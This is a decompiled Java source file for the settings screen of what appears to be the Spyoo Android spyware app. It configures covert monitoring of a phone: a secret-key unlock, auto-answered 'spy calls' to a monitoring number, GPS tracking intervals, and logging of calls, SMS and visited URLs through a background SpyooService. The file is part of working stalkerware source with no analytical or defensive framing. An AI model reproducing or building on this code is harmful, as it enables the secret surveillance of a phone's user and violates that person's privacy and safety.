package iits.spyoo;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ListActivity;
import android.content.DialogInterface;
import android.content.Intent;
import android.location.LocationManager;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.SeekBar;
import android.widget.TextView;
import iits.code.bus.Setting_BUS;
import iits.code.dto.Setting_DTO;
import iits.common.Constants;
import iits.common.Function;
import iits.mamager.FileManager;
import iits.service.SpyooService;

public class Setting extends ListActivity {
    private static final int OPTION_AUTOANSWER = 2;
    private static final int OPTION_CALL = 3;
    private static final int OPTION_GENERAL = 0;
    private static final int OPTION_GPS = 1;
    private static final int OPTION_SMS = 4;
    private static final int OPTION_URL = 5;
    private static final String TAG = "Setting";
    boolean autoAnswerIsChecked = false;
    private AlertDialog.Builder builder;
    boolean callIsChecked = false;
    CheckBox cbActive;
    CheckBox cbSavePosition;
    String[] descriptions;
    EditText etMonitoringPhone;
    EditText etSecretKey;
    ImageButton ibCaptureMoveMinus;
    ImageButton ibCaptureMovePlus;
    ImageButton ibCaptureTimeMinus;
    ImageButton ibCaptureTimePlus;
    String[] items;
    SeekBar sbAltitude;
    SeekBar sbCaptureMove;
    SeekBar sbCaptureTime;
    Setting_DTO setting;
    boolean smsIsChecked = false;
    TextView tvAltitude;
    TextView tvCaptureMove;
    TextView tvCaptureTime;
    boolean urlIsChecked = false;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.setting);
        try {
            this.setting = Setting_BUS.get(getApplicationContext());
            this.items = getResources().getStringArray(R.array.itemsettings);
            this.descriptions = getResources().getStringArray(R.array.descriptionitemsettings);
            setListAdapter(new SettingAdapter(this));
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onCreate function: " + e.toString());
        }
    }

    class SettingAdapter extends ArrayAdapter<String> {
        Activity context;

        SettingAdapter(Activity context2) {
            super(context2, (int) R.layout.row_setting, Setting.this.items);
            this.context = context2;
        }

        public View getView(int position, View convertView, ViewGroup parent) {
            View row = this.context.getLayoutInflater().inflate(R.layout.row_setting, (ViewGroup) null);
            ((TextView) row.findViewById(R.id.tvTitle)).setText(Setting.this.items[position]);
            ((TextView) row.findViewById(R.id.tvDescription)).setText(Setting.this.descriptions[position]);
            ImageView icon = (ImageView) row.findViewById(R.id.ivOption);
            Setting.this.autoAnswerIsChecked = Setting.this.setting.getFlagSpyCall();
            Setting.this.callIsChecked = Setting.this.setting.getFlagCall();
            Setting.this.smsIsChecked = Setting.this.setting.getFlagSMS();
            Setting.this.urlIsChecked = Setting.this.setting.getFlagURL();
            switch (position) {
                case 2:
                    if (!Setting.this.autoAnswerIsChecked) {
                        icon.setImageResource(R.drawable.check0);
                        break;
                    } else {
                        icon.setImageResource(R.drawable.check1);
                        break;
                    }
                case 3:
                    if (!Setting.this.callIsChecked) {
                        icon.setImageResource(R.drawable.check0);
                        break;
                    } else {
                        icon.setImageResource(R.drawable.check1);
                        break;
                    }
                case 4:
                    if (!Setting.this.smsIsChecked) {
                        icon.setImageResource(R.drawable.check0);
                        break;
                    } else {
                        icon.setImageResource(R.drawable.check1);
                        break;
                    }
                case 5:
                    if (!Setting.this.urlIsChecked) {
                        icon.setImageResource(R.drawable.check0);
                        break;
                    } else {
                        icon.setImageResource(R.drawable.check1);
                        break;
                    }
                default:
                    icon.setImageResource(R.drawable.select);
                    break;
            }
            return row;
        }
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_settings, menu);
        return true;
    }

    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.miSetDefault:
                this.setting.setRunMode(true);
                this.setting.setSecretKey(Constants.SECRET_KEY);
                this.setting.setFlagGPS(true);
                this.setting.setGPSInterval(5);
                this.setting.setHorizontal(500);
                this.setting.setFlagSpyCall(false);
                this.setting.setFlagCall(true);
                this.setting.setFlagSMS(true);
                this.setting.setFlagURL(true);
                this.setting.setSendSetting(true);
                Setting_BUS.update(getApplicationContext(), this.setting);
                Intent i = new Intent(this, Setting.class);
                i.setFlags(268435456);
                startActivity(i);
                finish();
                break;
            case R.id.miBack:
                if (!Function.compareSettingsObject(this.setting, Setting_BUS.get(getApplicationContext()))) {
                    this.setting.setSendSetting(true);
                    Setting_BUS.update(getApplicationContext(), this.setting);
                    restartServer();
                }
                showLoginForm();
                break;
        }
        return true;
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        super.onKeyDown(keyCode, event);
        if (keyCode != 4) {
            return false;
        }
        if (!Function.compareSettingsObject(this.setting, Setting_BUS.get(getApplicationContext()))) {
            this.setting.setSendSetting(true);
            Setting_BUS.update(getApplicationContext(), this.setting);
            restartServer();
        }
        showLoginForm();
        return true;
    }

    public void onListItemClick(ListView parent, View v, int position, long id) {
        switch (position) {
            case 0:
                showDialogGeneral();
                return;
            case 1:
                showDialogGPS();
                return;
            case 2:
                ImageView icon = (ImageView) v.findViewById(R.id.ivOption);
                if (this.autoAnswerIsChecked) {
                    this.autoAnswerIsChecked = false;
                    this.setting.setFlagSpyCall(false);
                    icon.setImageResource(R.drawable.check0);
                    return;
                }
                this.autoAnswerIsChecked = true;
                this.setting.setFlagSpyCall(true);
                icon.setImageResource(R.drawable.check1);
                if (this.setting.getSpyCallNumber().equals("")) {
                    showDialogAutoAnswerAlert();
                    return;
                }
                return;
            case 3:
                ImageView icon2 = (ImageView) v.findViewById(R.id.ivOption);
                if (this.callIsChecked) {
                    this.callIsChecked = false;
                    this.setting.setFlagCall(false);
                    icon2.setImageResource(R.drawable.check0);
                    return;
                }
                this.callIsChecked = true;
                this.setting.setFlagCall(true);
                icon2.setImageResource(R.drawable.check1);
                return;
            case 4:
                ImageView icon3 = (ImageView) v.findViewById(R.id.ivOption);
                if (this.smsIsChecked) {
                    this.smsIsChecked = false;
                    this.setting.setFlagSMS(false);
                    icon3.setImageResource(R.drawable.check0);
                    return;
                }
                this.smsIsChecked = true;
                this.setting.setFlagSMS(true);
                icon3.setImageResource(R.drawable.check1);
                return;
            case 5:
                ImageView icon4 = (ImageView) v.findViewById(R.id.ivOption);
                if (this.urlIsChecked) {
                    this.urlIsChecked = false;
                    this.setting.setFlagURL(false);
                    icon4.setImageResource(R.drawable.check0);
                    return;
                }
                this.urlIsChecked = true;
                this.setting.setFlagURL(true);
                icon4.setImageResource(R.drawable.check1);
                return;
            default:
                return;
        }
    }

    public void showMessageBox(int title, int icon, int message, int buttonText) {
        this.builder = new AlertDialog.Builder(this);
        this.builder.setTitle(title);
        this.builder.setIcon(icon);
        this.builder.setMessage(message);
        this.builder.setNeutralButton(buttonText, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass1 */

            public void onClick(DialogInterface dialog, int whichButton) {
                dialog.dismiss();
            }
        });
        this.builder.show();
    }

    public void showMessageBoxGeneral(int title, int icon, int message, int buttonText) {
        this.builder = new AlertDialog.Builder(this);
        this.builder.setTitle(title);
        this.builder.setIcon(icon);
        this.builder.setMessage(message);
        this.builder.setNeutralButton(buttonText, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass2 */

            public void onClick(DialogInterface dialog, int whichButton) {
                Setting.this.showDialogGeneral();
                dialog.dismiss();
            }
        });
        this.builder.show();
    }

    public void showDialogSaveSetting(int title, int icon, int message) {
        this.builder = new AlertDialog.Builder(this);
        this.builder.setTitle(title);
        this.builder.setIcon(icon);
        this.builder.setMessage(message);
        this.builder.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass3 */

            public void onClick(DialogInterface dialog, int whichButton) {
                Setting_BUS.update(Setting.this.getApplicationContext(), Setting.this.setting);
                Setting.this.restartServer();
                dialog.dismiss();
                Setting.this.showLoginForm();
            }
        });
        this.builder.setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass4 */

            public void onClick(DialogInterface dialog, int whichButton) {
                dialog.dismiss();
                Setting.this.showLoginForm();
            }
        });
        this.builder.show();
    }

    public void showDialogGeneral() {
        View layout = ((LayoutInflater) getApplicationContext().getSystemService("layout_inflater")).inflate(R.layout.dialog_general, (ViewGroup) findViewById(R.id.layout_root));
        this.cbActive = (CheckBox) layout.findViewById(R.id.cbActive);
        this.etSecretKey = (EditText) layout.findViewById(R.id.etSecretKey);
        this.etMonitoringPhone = (EditText) layout.findViewById(R.id.etMonitoringPhone);
        this.cbActive.setChecked(this.setting.getRunMode());
        this.etSecretKey.setText(this.setting.getSecretKey());
        this.etMonitoringPhone.setText(this.setting.getSpyCallNumber());
        this.etSecretKey.addTextChangedListener(new TextWatcher() {
            /* class iits.spyoo.Setting.AnonymousClass5 */

            public void afterTextChanged(Editable s) {
                String secretKey = Setting.this.etSecretKey.getText().toString();
                String keyStart = secretKey.substring(0, 1);
                String keyEnd = secretKey.substring(secretKey.length() - 1, secretKey.length());
                boolean flag = false;
                if (!keyStart.equals("#")) {
                    secretKey = "#" + secretKey.replaceAll("#", "");
                    flag = true;
                }
                if (!keyEnd.equals("*")) {
                    secretKey = String.valueOf(secretKey) + "*";
                    flag = true;
                }
                if (flag) {
                    Setting.this.etSecretKey.setText(secretKey);
                }
            }

            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }
        });
        this.builder = new AlertDialog.Builder(this);
        this.builder.setView(layout);
        this.builder.setIcon(R.drawable.select);
        this.builder.setTitle(R.string.general);
        this.builder.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass6 */

            public void onClick(DialogInterface dialog, int whichButton) {
                if (Setting.this.etSecretKey.getText().length() < 5) {
                    Setting.this.showMessageBoxGeneral(R.string.warning, R.drawable.warning, R.string.error_secretkey, R.string.ok);
                } else {
                    Setting.this.setting.setRunMode(Setting.this.cbActive.isChecked());
                    Setting.this.setting.setSecretKey(Setting.this.etSecretKey.getText().toString().trim());
                    Setting.this.setting.setSpyCallNumber(Setting.this.etMonitoringPhone.getText().toString().trim());
                }
                dialog.dismiss();
            }
        });
        this.builder.setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass7 */

            public void onClick(DialogInterface dialog, int whichButton) {
                dialog.dismiss();
            }
        });
        this.builder.show();
    }

    public void showDialogGPS() {
        String time;
        View layout = ((LayoutInflater) getApplicationContext().getSystemService("layout_inflater")).inflate(R.layout.dialog_gps, (ViewGroup) findViewById(R.id.layout_root));
        this.cbSavePosition = (CheckBox) layout.findViewById(R.id.cbSavePosition);
        this.sbCaptureTime = (SeekBar) layout.findViewById(R.id.sbCaptureTime);
        this.sbCaptureMove = (SeekBar) layout.findViewById(R.id.sbCaptureMove);
        this.sbAltitude = (SeekBar) layout.findViewById(R.id.sbAltitude);
        this.tvCaptureTime = (TextView) layout.findViewById(R.id.tvCaptureTime);
        this.tvCaptureMove = (TextView) layout.findViewById(R.id.tvCaptureMove);
        this.tvAltitude = (TextView) layout.findViewById(R.id.tvAltitude);
        this.ibCaptureTimeMinus = (ImageButton) layout.findViewById(R.id.ibCaptureTimeMinus);
        this.ibCaptureTimePlus = (ImageButton) layout.findViewById(R.id.ibCaptureTimePlus);
        this.ibCaptureMoveMinus = (ImageButton) layout.findViewById(R.id.ibCaptureMoveMinus);
        this.ibCaptureMovePlus = (ImageButton) layout.findViewById(R.id.ibCaptureMovePlus);
        this.cbSavePosition.setChecked(this.setting.getFlagGPS());
        this.sbCaptureTime.setProgress(this.setting.getGPSInterval() - 5);
        this.sbCaptureMove.setProgress((this.setting.getHorizontal() - Constants.MIN_HORIZONTAL) / 10);
        this.sbAltitude.setProgress(this.setting.getVertical() - 5);
        int h = this.setting.getGPSInterval() / 60;
        int m = this.setting.getGPSInterval() % 60;
        if (m < 10) {
            time = String.valueOf(String.valueOf(h)) + " h 0" + String.valueOf(m) + " mn";
        } else {
            time = String.valueOf(String.valueOf(h)) + " h " + String.valueOf(m) + " mn";
        }
        this.tvCaptureTime.setText(time);
        this.tvCaptureMove.setText(String.valueOf(String.valueOf(this.setting.getHorizontal())) + " m");
        this.tvAltitude.setText(String.valueOf(String.valueOf(this.setting.getVertical())) + " m");
        this.builder = new AlertDialog.Builder(this);
        this.builder.setView(layout);
        this.builder.setIcon(R.drawable.select);
        this.builder.setTitle(R.string.gps);
        this.sbCaptureTime.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
            /* class iits.spyoo.Setting.AnonymousClass8 */

            public void onStopTrackingTouch(SeekBar seekBar) {
            }

            public void onStartTrackingTouch(SeekBar seekBar) {
            }

            public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
                String time;
                int h = (progress + 5) / 60;
                int m = (progress + 5) % 60;
                if (m < 10) {
                    time = String.valueOf(String.valueOf(h)) + " h 0" + String.valueOf(m) + " mn";
                } else {
                    time = String.valueOf(String.valueOf(h)) + " h " + String.valueOf(m) + " mn";
                }
                Setting.this.tvCaptureTime.setText(time);
            }
        });
        this.sbCaptureMove.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
            /* class iits.spyoo.Setting.AnonymousClass9 */

            public void onStopTrackingTouch(SeekBar seekBar) {
            }

            public void onStartTrackingTouch(SeekBar seekBar) {
            }

            public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
                Setting.this.tvCaptureMove.setText(String.valueOf(String.valueOf((progress * 10) + Constants.MIN_HORIZONTAL)) + " m");
            }
        });
        this.sbAltitude.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
            /* class iits.spyoo.Setting.AnonymousClass10 */

            public void onStopTrackingTouch(SeekBar seekBar) {
            }

            public void onStartTrackingTouch(SeekBar seekBar) {
            }

            public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
                Setting.this.tvAltitude.setText(String.valueOf(String.valueOf(progress + 5)) + " m");
            }
        });
        this.cbSavePosition.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            /* class iits.spyoo.Setting.AnonymousClass11 */

            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked && !((LocationManager) Setting.this.getSystemService("location")).isProviderEnabled("gps")) {
                    Setting.this.showDialogGpsDisabledAlert();
                }
            }
        });
        this.ibCaptureTimeMinus.setOnClickListener(new View.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass12 */

            public void onClick(View v) {
                Setting.this.sbCaptureTime.setProgress(Setting.this.sbCaptureTime.getProgress() - 1);
            }
        });
        this.ibCaptureTimePlus.setOnClickListener(new View.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass13 */

            public void onClick(View v) {
                Setting.this.sbCaptureTime.setProgress(Setting.this.sbCaptureTime.getProgress() + 1);
            }
        });
        this.ibCaptureMoveMinus.setOnClickListener(new View.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass14 */

            public void onClick(View v) {
                Setting.this.sbCaptureMove.setProgress(Setting.this.sbCaptureMove.getProgress() - 1);
            }
        });
        this.ibCaptureMovePlus.setOnClickListener(new View.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass15 */

            public void onClick(View v) {
                Setting.this.sbCaptureMove.setProgress(Setting.this.sbCaptureMove.getProgress() + 1);
            }
        });
        this.builder.setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass16 */

            public void onClick(DialogInterface dialog, int whichButton) {
                dialog.dismiss();
            }
        });
        this.builder.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass17 */

            public void onClick(DialogInterface dialog, int whichButton) {
                Setting.this.setting.setFlagGPS(Setting.this.cbSavePosition.isChecked());
                Setting.this.setting.setGPSInterval(Setting.this.sbCaptureTime.getProgress() + 5);
                Setting.this.setting.setHorizontal((Setting.this.sbCaptureMove.getProgress() * 10) + Constants.MIN_HORIZONTAL);
                Setting.this.setting.setVertical(Setting.this.sbAltitude.getProgress() + 5);
                dialog.dismiss();
            }
        });
        this.builder.show();
    }

    /* access modifiers changed from: private */
    /* access modifiers changed from: public */
    private void showDialogGpsDisabledAlert() {
        this.builder = new AlertDialog.Builder(this);
        this.builder.setTitle(R.string.gps);
        this.builder.setIcon(R.drawable.warning);
        this.builder.setMessage(R.string.gps_disabled_alert);
        this.builder.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass18 */

            public void onClick(DialogInterface dialog, int id) {
                Setting.this.showGpsOptions();
                dialog.dismiss();
            }
        });
        this.builder.setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass19 */

            public void onClick(DialogInterface dialog, int id) {
                dialog.dismiss();
            }
        });
        this.builder.show();
    }

    private void showDialogAutoAnswerAlert() {
        this.builder = new AlertDialog.Builder(this);
        this.builder.setTitle(R.string.auto_answer);
        this.builder.setIcon(R.drawable.warning);
        this.builder.setMessage(R.string.autoanswer_alert);
        this.builder.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass20 */

            public void onClick(DialogInterface dialog, int id) {
                Setting.this.showDialogGeneral();
                dialog.dismiss();
            }
        });
        this.builder.setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
            /* class iits.spyoo.Setting.AnonymousClass21 */

            public void onClick(DialogInterface dialog, int id) {
                dialog.dismiss();
            }
        });
        this.builder.show();
    }

    public void showLoginForm() {
        FileManager.WriteLog(1, TAG, "click back button");
        Intent i = new Intent(this, Login.class);
        i.setFlags(268435456);
        startActivity(i);
        finish();
    }

    public void restartServer() {
        stopService(new Intent(this, SpyooService.class));
        startService(new Intent(this, SpyooService.class));
    }

    /* access modifiers changed from: private */
    /* access modifiers changed from: public */
    private void showGpsOptions() {
        startActivity(new Intent("android.settings.LOCATION_SOURCE_SETTINGS"));
    }
}
